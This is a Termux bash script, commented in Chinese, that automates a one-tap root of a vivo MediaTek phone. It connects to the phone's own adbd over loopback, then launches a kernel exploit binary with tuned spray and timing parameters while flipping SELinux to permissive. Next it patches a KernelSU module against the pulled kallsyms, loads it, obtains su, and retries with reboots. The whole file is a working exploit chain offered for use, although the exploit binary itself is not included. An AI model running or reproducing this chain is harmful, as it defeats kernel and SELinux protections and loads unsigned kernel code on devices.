#!/data/data/com.termux/files/usr/bin/bash
# ============================================================================
#  GhostLock-MT6983T — 手机端一键 root（无需电脑）
#
#  原理：exploit 必须以 uid 2000 / u:r:shell:s0 的进程发起（untrusted_app 域
#  开不了 perf_event、也写不了 /data/local/tmp）。手机内部通过 loopback TCP 连
#  自己的 adbd（persist.adb.tcp.port=5555 + 密钥鉴权）拿到的 shell 与 USB adb
#  完全等价，于是整条链都能在手机上跑完：发枪 → kallsyms → 补丁 → insmod →
#  授权 → 修复 → 验证。复用的是与电脑端完全相同的 exploit / 补丁脚本 / loader，
#  只把「电脑端 adb」换成「手机内部 adb」。
#
#  用法（Termux 内）：
#     bash ~/ghostlock/root.sh            # 手动跑
#     bash ~/ghostlock/root.sh --auto     # Termux:Boot 开机自动跑（带失败重启重试）
#
#  注意：
#   - 每次开机 root 都会消失，需要重跑；同一 boot 内不要重复发枪。
#   - 发枪窗口内脚本只用一条 tail -f 常驻流读日志、本地文件轮询，绝不 spawn 高频
#     adb 轮询（exploit 的栈时序对调度噪声极敏感）。
#   - 发枪期间默认关 WiFi/移动数据降低噪声（loopback 不受影响），结束后自动恢复。
#   - root 真伪看 su 通道（su -c id）：手机内 adbd 恒为 uid=2000(shell)，那是连接
#     身份不是 root 状态；电脑端「adb root 后 adb shell=uid 0」的结束态在手机端
#     不存在。SakiSU 管理器被 vivo seccomp 击杀探针产生的报错是噪声，不影响 su。
#   - 若已在管理器里开过【ADB Root】且 KSU 已加载（adbd 直接以 root 运行），脚本
#     跳过发枪，直接进入修复/验证快速路径。
# ============================================================================
set -u

GL="${GL_DIR:-$HOME/ghostlock}"
PREFIX="${PREFIX:-/data/data/com.termux/files/usr}"
# adb 的临时目录取自 TMPDIR；非交互式上下文（su -c / boot 脚本）里可能没设，
# 不设的话 adb 会去写 /data/local/tmp/adb.<uid>.log（Termux uid 无权限），
# server 起不来 → "ADB server didn't ACK / cannot connect to daemon"。
export TMPDIR="${TMPDIR:-$PREFIX/tmp}"
mkdir -p "$TMPDIR" 2>/dev/null
ADB="$PREFIX/bin/adb"
SERIAL="${GL_SERIAL:-127.0.0.1:5555}"
T=/data/local/tmp
MANAGER=com.sakisu.sakisu
FIRE_TIMEOUT="${GL_FIRE_TIMEOUT:-300}"
MAX_FIRE="${GL_MAX_FIRE:-3}"
KEEP_RADIOS="${GL_KEEP_RADIOS:-0}"
AUTO=0
[ "${1:-}" = "--auto" ] && AUTO=1

mkdir -p "$GL"
RUNLOG="$GL/root_run.log"
exec > >(tee -a "$RUNLOG") 2>&1

say()  { printf '\033[36m[*]\033[0m %s\n' "$*"; }
ok()   { printf '\033[32m[+]\033[0m %s\n' "$*"; }
warn() { printf '\033[33m[!]\033[0m %s\n' "$*"; }
die()  { printf '\033[31m[-]\033[0m %s\n' "$*"; exit 1; }

sh_()  { "$ADB" -s "$SERIAL" shell "$@" 2>&1 | tr -d '\r'; }
sid()  { "$ADB" -s "$SERIAL" shell "id" 2>&1 | tr -d '\r'; }

# Mirror the run log to /data/local/tmp (shell-readable) once per phase, so the
# progress is observable from any adb shell even before root exists.
sync_log() {
  "$ADB" -s "$SERIAL" push "$RUNLOG" "$T/gl_ondevice.log" >/dev/null 2>&1
}

RADIOS_OFF=0
restore_radios() {
  [ "$RADIOS_OFF" = 1 ] || return 0
  RADIOS_OFF=0
  sh_ "svc wifi enable; svc data enable" >/dev/null 2>&1
  say "已恢复 WiFi / 移动数据"
}

if command -v termux-wake-lock >/dev/null 2>&1; then termux-wake-lock; fi
trap 'restore_radios' EXIT

# ---------------------------------------------------------------- 0) 连接本机 adbd
say "连接手机自身的 adbd（$SERIAL）"
"$ADB" start-server >/dev/null 2>&1
# adbd 可能刚被管理器里的【ADB Root】开关重启过（或本就未就绪），首个 shell 可能
# 撞上 "error: closed" —— connect + 探测重试若干轮再放弃。
SID0=""
for i in $(seq 1 10); do
  "$ADB" connect "$SERIAL" >/dev/null 2>&1
  SID0=$(sid)
  case "$SID0" in *uid=0*|*uid=2000*) break;; esac
  sleep 2
done
ADBD_ROOT=0
if printf '%s' "$SID0" | grep -q 'uid=0'; then
  # 管理器里开过【ADB Root】且 KSU 已加载：adbd 直接以 root 运行，
  # 本 boot 已有 root —— 无需发枪，直接走修复/验证快速路径。
  ADBD_ROOT=1
  ok "本机 shell 直接是 root（ADB Root + KSU 生效）：$(printf '%s' "$SID0" | cut -c1-72)"
elif printf '%s' "$SID0" | grep -q 'uid=2000'; then
  ok "本机 shell 就绪：$SID0"
else
  die "拿不到可用 shell（uid 既不是 2000 也不是 0）。检查：开发者选项里 USB 调试是否开启、是否已执行过电脑端一次性配置（persist.adb.tcp.port + 密钥授权）。"
fi
sync_log

# ---------------------------------------------------------------- 1) 状态判定
BOOTID=$(sh_ "cat /proc/sys/kernel/random/boot_id")
ENF=$(sh_ "cat /sys/fs/selinux/enforce")
KSU=$(sh_ "grep -w kernelsu /proc/modules")
CLEAN=1
printf '%s' "$BOOTID" | grep -Eq '^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$' || CLEAN=0
[ "$ENF" = "1" ] || CLEAN=0

if [ "$ADBD_ROOT" = 1 ]; then
  say "ADB Root 模式（shell 即 root）——跳过发枪，直接进入修复/验证"
  PHASE=fix
elif [ -n "$KSU" ]; then
  ok "KSU 模块已加载（本轮已提过权）：$(printf '%s' "$KSU" | cut -c1-60)"
  PHASE=fix
elif [ "$CLEAN" = 1 ]; then
  ok "干净 boot：boot_id=$BOOTID enforce=$ENF"
  PHASE=fire
else
  warn "不是干净 boot（boot_id=$BOOTID enforce=$ENF，可能上轮发枪残留）"
  if [ "$AUTO" = 1 ]; then
    say "自动模式：重启后由 Termux:Boot 重新接管（最多 $MAX_FIRE 轮）"
    C="$GL/auto_attempts"
    N=$(cat "$C" 2>/dev/null || echo 0)
    if [ "$N" -ge "$MAX_FIRE" ]; then
      die "已连续 $N 轮未成功，停止自动重试（删掉 $C 可重置）。"
    fi
    echo $((N + 1)) > "$C"
    sh_ "reboot" >/dev/null 2>&1
    exit 0
  fi
  die "请重启手机（root 不持久化，重启后是干净 boot），再运行本脚本。"
fi

if [ "$PHASE" = "fire" ]; then
  # -------------------------------------------------------------- 2) 准备文件
  say "检查设备端 exploit / loader"
  LH=$(sha256sum "$GL/gl_mcast43" | cut -d' ' -f1)
  RH=$(sh_ "sha256sum $T/gl_mcast43 2>/dev/null" | cut -d' ' -f1)
  if [ "$LH" != "$RH" ]; then
    say "推送 exploit（设备端版本不一致或缺失）"
    "$ADB" -s "$SERIAL" push "$GL/gl_mcast43" "$T/gl_mcast43" >/dev/null || die "推送 exploit 失败"
    sh_ "chmod 755 $T/gl_mcast43" >/dev/null
  fi
  sh_ "mkdir -p $T/rundir $T/p5" >/dev/null
  "$ADB" -s "$SERIAL" push "$GL/ksu_loader.sh" "$T/rundir/ksu_loader.sh" >/dev/null || die "推送 loader 失败"
  sh_ "chmod 755 $T/rundir/ksu_loader.sh" >/dev/null
  if ! sh_ "sh -n $T/rundir/ksu_loader.sh; echo rc=\$?" | grep -q 'rc=0'; then
    die "设备端 ksu_loader.sh 语法检查失败（换行符或内容损坏），检查仓库文件是否为 LF。"
  fi
  ok "文件就绪"

  # 自动模式：刚开机后台活动最重，先等负载沉淀再发枪（手动模式由用户把握时机）
  if [ "$AUTO" = 1 ]; then
    settle="${GL_BOOT_DELAY:-120}"
    say "自动模式：等开机后台活动沉淀 ${settle}s 再发枪"
    sleep "$settle"
  fi

  # 降噪：发枪期间关无线（loopback 不受影响），结束后 trap 恢复
  if [ "$KEEP_RADIOS" != "1" ]; then
    sh_ "svc wifi disable; svc data disable" >/dev/null 2>&1
    RADIOS_OFF=1
  fi

  # -------------------------------------------------------------- 3) 发枪
  attempt=1
  while [ "$attempt" -le "$MAX_FIRE" ]; do
    say "发枪（第 $attempt/$MAX_FIRE 次，GhostLock r44 定版参数）"
    sh_ "rm -f $T/ksu_ready $T/ksu_stage1.log $T/ksu_stage2.log $T/kallsyms.txt $T/run_auto.log" >/dev/null
    : > "$GL/fire.log"
    "$ADB" -s "$SERIAL" shell "tail -f $T/run_auto.log" > "$GL/fire.log" 2>&1 &
    TPID=$!
    sh_ "cd $T && KSU_RUNDIR=$T/rundir KSU_LOADER=1 FLIP_PERMISSIVE=1 SYSCTL_WALK_ATTEMPTS=4 SLIDE_MCAST_SHIFT=21 SLIDE_MCAST_GAP_US=300 SLIDE_MCAST_ROUNDS=10000 GL_ANCHOR_SURVIVE=1 nohup ./gl_mcast43 > run_auto.log 2>&1 &" >/dev/null
    start=$(date +%s); res=timeout
    while :; do
      grep -q 'exploit chain complete' "$GL/fire.log" 2>/dev/null && { res=ok; break; }
      grep -q 'stage failed' "$GL/fire.log" 2>/dev/null && { res=fail; break; }
      kill -0 "$TPID" 2>/dev/null || { res=dead; break; }
      [ $(( $(date +%s) - start )) -gt "$FIRE_TIMEOUT" ] && break
      if [ $(( ($(date +%s) - start) % 15 )) -lt 3 ]; then
        say "  发枪进行中（$(( $(date +%s) - start ))s）…"
        sleep 3
      else
        sleep 1
      fi
    done
    kill "$TPID" 2>/dev/null; wait "$TPID" 2>/dev/null
    tail -n 6 "$GL/fire.log" | sed 's/^/    | /'

    [ "$res" = ok ] && break
    warn "本轮发枪未完成（$res）"
    attempt=$((attempt + 1))
    [ "$attempt" -gt "$MAX_FIRE" ] && break
    if [ "$res" = dead ] || ! sid | grep -q 'uid=2000'; then
      say "设备似乎已重启，等待回来…"
      "$ADB" wait-for-device >/dev/null 2>&1
      for i in $(seq 1 60); do
        [ "$(sh_ 'getprop sys.boot_completed')" = "1" ] && break
        sleep 2
      done
      sleep 5
    else
      say "重启回干净状态后重试…"
      sh_ "reboot" >/dev/null 2>&1
      "$ADB" wait-for-device >/dev/null 2>&1
      for i in $(seq 1 60); do
        [ "$(sh_ 'getprop sys.boot_completed')" = "1" ] && break
        sleep 2
      done
      sleep 5
    fi
    "$ADB" connect "$SERIAL" >/dev/null 2>&1
  done
  [ "$res" = ok ] || die "发枪 $MAX_FIRE 次均失败，请重启手机后重试（同 boot 内不要连发）。"
  ok "发枪成功：exploit chain complete"
  sync_log

  # -------------------------------------------------------------- 4) kallsyms
  say "等待并拉取 kallsyms（kernel 域读取）"
  got=0
  for i in $(seq 1 40); do
    s1=$(sh_ "cat $T/ksu_stage1.log 2>/dev/null")
    case "$s1" in *KALLSYMS_DONE*) ok "$s1"; got=1; break;; esac
    sleep 3
  done
  [ "$got" = 1 ] || die "超时未出现 KALLSYMS_DONE（看 $T/rundir/root_exec.log）。"
  "$ADB" -s "$SERIAL" pull "$T/kallsyms.txt" "$GL/kallsyms.txt" >/dev/null || die "pull kallsyms 失败"
  ok "kallsyms.txt 已拉取"

  # -------------------------------------------------------------- 5) 本地补丁
  say "补丁链（vermagic + SHN_ABS）"
  ( cd "$GL" && python patch_vermagic.py sakisu_raw.ko ksu_v.ko && \
              python patch_shnabs.py ksu_v.ko ksu_final.ko unknown_syms.txt kallsyms.txt ) \
     || die "补丁链失败（python 装了吗？pkg install python）"
  [ -f "$GL/ksu_final.ko" ] || die "未生成 ksu_final.ko"
  ok "ksu_final.ko 已生成"

  # -------------------------------------------------------------- 6) insmod
  say "推送并加载 SakiSU 模块"
  "$ADB" -s "$SERIAL" push "$GL/ksu_final.ko" "$T/p5/ksu_final.ko" >/dev/null || die "推送 .ko 失败"
  sh_ "touch $T/ksu_ready" >/dev/null
  ins=0
  for i in $(seq 1 20); do
    s2=$(sh_ "cat $T/ksu_stage2.log 2>/dev/null")
    case "$s2" in *"INSMOD_DONE rc=0"*) ok "INSMOD_DONE rc=0"; ins=1; break;; esac
    sleep 3
  done
  if [ "$ins" != 1 ]; then
    sh_ "cat $T/ksu_stage2.log $T/rundir/root_exec.log" | tail -n 15
    die "insmod 失败（跨 boot 不能复用旧 kallsyms，必须本轮重新拉）。"
  fi
fi  # PHASE=fire

# ---------------------------------------------------------------- 7) 授权 + root
say "等待 root 授权（需要时请在 SakiSU 管理器里点一次【允许】）"
sh_ "monkey -p $MANAGER -c android.intent.category.LAUNCHER 1" >/dev/null 2>&1
ROOTED=0
for i in $(seq 1 40); do
  if sid | grep -q 'uid=0'; then ROOTED=2; break; fi                 # adbd 已是 root
  if sh_ "su -c id" | grep -q 'uid=0'; then ROOTED=1; break; fi     # su 可用
  sleep 3
done
if [ "$ROOTED" = 0 ]; then
  die "还没拿到 root。请在手机上打开 SakiSU 管理器，按提示点【允许】（首次还需在设置里开 ADB root），
    然后重跑本脚本（KSU 已加载时会跳过发枪，直接接着做授权与修复）。
    注意：不要在本脚本外单独跑 adb root —— 它会让 adbd 重启并丢掉 TCP 监听，手机内脚本就连不上自己了。"
fi
ok "root 已就绪（$( [ "$ROOTED" = 1 ] && echo 'su' || echo 'adb root' )）"
# 双通道自适应：正常走 su；adbd 本身已是 root 时（罕见）直接 shell，避免多余依赖
if [ "$ROOTED" = 2 ]; then
  R() { sh_ "$*"; }
else
  R() { sh_ "su -c '$*'"; }
fi

# ---------------------------------------------------------------- 8) 修复
say "修复：SELinux 回 Enforcing + 重载策略（修网络）"
R "setenforce 0"
R "load_policy /sys/fs/selinux/policy"
R "setenforce 1"
sh_ "cat /sys/fs/selinux/enforce"; sh_ "getenforce"
# boot_id 已由模块内核侧恢复；节点不匹配时才兜底
if [ -f "$GL/fix_ashmem.sh" ]; then
  "$ADB" -s "$SERIAL" push "$GL/fix_ashmem.sh" "$T/fix_ashmem.sh" >/dev/null 2>&1
  R "sh $T/fix_ashmem.sh" >/dev/null 2>&1
fi
restore_radios

# ---------------------------------------------------------------- 9) 验证
say "最终验证"
# root 真伪看 su 通道：手机内 adbd 恒为 uid=2000(shell)，那是连接身份，不代表没
# root（电脑端「adb root 后 adb shell=uid 0」的结束态在手机端不存在）。
if [ "$ROOTED" = 2 ]; then
  VID=$(sh_ 'id')
else
  VID=$(sh_ "su -c id")
fi
echo "  enforce : $(sh_ 'cat /sys/fs/selinux/enforce')"
echo "  root id : ${VID:-<取不到，回 SakiSU 管理器确认授权>}"
echo "  adb id  : $(sh_ 'id')   （=uid=2000(shell) 属正常，仅连接身份）"
echo "  boot_id : $(sh_ 'cat /proc/sys/kernel/random/boot_id')"
echo "  lsmod   : $(sh_ 'grep -w kernelsu /proc/modules' | cut -c1-50)"
sleep 4
PING=$(sh_ 'ping -c 2 -W 3 www.baidu.com' | tail -2)
echo "  ping    : $(printf '%s' "$PING" | tr '\n' ' ')"
warn "SakiSU 管理器如报错/提示异常：vivo seccomp 杀 libksud 探针的正常噪声，以 root id 为准。"
ok "完成（修复+验证均已执行）。同一 boot 内请勿重复发枪；下次开机后重新运行本脚本。"
sync_log
[ "$AUTO" = 1 ] && rm -f "$GL/auto_attempts"
if command -v termux-wake-unlock >/dev/null 2>&1; then termux-wake-unlock; fi
exit 0
